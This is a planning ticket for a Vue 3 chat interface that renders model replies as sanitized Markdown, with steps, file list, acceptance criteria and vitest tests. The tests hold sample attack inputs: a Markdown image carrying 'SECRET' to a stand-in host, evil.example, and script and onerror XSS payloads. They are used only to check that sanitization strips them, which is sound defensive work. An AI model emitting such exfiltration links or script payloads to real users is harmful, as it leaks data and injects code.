---
id: W1-07
title: "Chat UI with sanitized Markdown"
epic: AOS-W1
issue: https://github.com/amirwebd3v/agentic-os/issues/7
points: 5
wave: 4
risk: Medium
depends_on:
  - "[[W1-04-server-security]]"
skills:
  - vue-expert
---

# W1-07 — Chat UI (Vue 3) with safe Markdown rendering

**Points:** 5 · **Risk:** Medium · **Depends on:** W1-04 (can start against a mocked API in parallel with W1-06) · **Skill/agent:** `vue-expert`
Overview: [plan-review.md M10](../../plan-review.md) · Plan: [implementation-plan.md](../implementation-plan.md)

## Summary
A Vite + Vue 3 + Pinia + vue-router app with a sidebar of sessions grouped by area, a streaming chat view, the "Connect provider" banner, and a Review link (page built in W1-11). Markdown rendering is **sanitized**: remote images are dropped and links show as text, which closes the exfiltration path.

## Implementation steps
1. **Scaffold** `web/` (Vite Vue TS). Dev proxy: `/api` and `/login` → `http://127.0.0.1:3000`, with `changeOrigin: false` so the Host check sees `127.0.0.1:5173`, which is allowed in dev.
2. **`web/src/api.ts`:** a `fetch` wrapper that always sends `X-AOS: 1` and `credentials: 'same-origin'`. `streamMessage(sessionId, content, onDelta)` reads the SSE body with `ReadableStream` + `TextDecoder`. It doesn't use `EventSource`, because the request is a POST.
3. **Stores** (`web/src/stores/`): `sessions` (list, current, create, rename, setArea) and `provider` (status polled on load and after a reload).
4. **Views:**
   - `ChatView.vue`: message list, input (Enter sends, Shift+Enter adds a newline), stop button (aborts the fetch), "interrupted" badge.
   - `SessionSidebar.vue`: grouped by area, each with a badge showing `auto`, `flagged` (dot), `inbox` or `user`. New-session button with a mode picker (Chat or Persona). An area dropdown re-files the session.
   - `ProviderBanner.vue`: shown when `status !== 'ok'`, with instructions to run `pnpm secrets set anthropic`, then a Reload button.
5. **`web/src/markdown.ts`:** `marked` → `DOMPurify.sanitize` with hooks:
   - `<img>`: keep it only if `src` starts with `data:image/`, otherwise remove the element.
   - `<a>`: replace with `<span class="link" title="href">text (href)</span>`. The href is shown, never clickable. A copy button is fine.
   - Forbid `style`, `iframe`, `form`, `svg` and `math`.
   Render it with `v-html` **only** through this function. An ESLint rule (`vue/no-v-html`) stays on, with one documented exception at this single place.
6. **Accessibility basics:** keyboard focus order, `aria-live="polite"` on the streaming message, visible focus rings.

## Files
| File | Action |
|---|---|
| `web/` scaffold, `web/src/{api,markdown}.ts`, `web/src/stores/*`, `web/src/views/ChatView.vue`, `web/src/components/{SessionSidebar,ProviderBanner,MessageBubble}.vue` | Create |
| `web/test/markdown.test.ts` | Create (vitest + jsdom) |

## Tests — `web/test/markdown.test.ts`
```ts
import { test, expect } from 'vitest';
import { renderMarkdown } from '../src/markdown';

test('remote images are removed (exfiltration)', () => {
  const html = renderMarkdown('hi ![x](https://evil.example/p?q=SECRET)');
  expect(html).not.toContain('evil.example');
  expect(html).not.toContain('<img');
});
test('links are not clickable', () => {
  const html = renderMarkdown('[click](https://evil.example)');
  expect(html).not.toContain('<a');
  expect(html).toContain('https://evil.example');
});
test('scripts and event handlers are stripped', () => {
  const html = renderMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>');
  expect(html).not.toMatch(/onerror|<script/);
});
test('data: images survive', () => {
  expect(renderMarkdown('![a](data:image/png;base64,iVBORw0KGgo=)')).toContain('<img');
});
```

## Acceptance criteria
- [ ] You can create a session, chat with streamed tokens, stop the reply, re-file a session, and see the "interrupted" state.
- [ ] A model reply containing `![](https://example.com/x.png)` triggers **no** network request (DevTools Network tab is empty, and CSP backs it up).
- [ ] The banner appears without a key and disappears after `pnpm secrets set anthropic` + Reload.
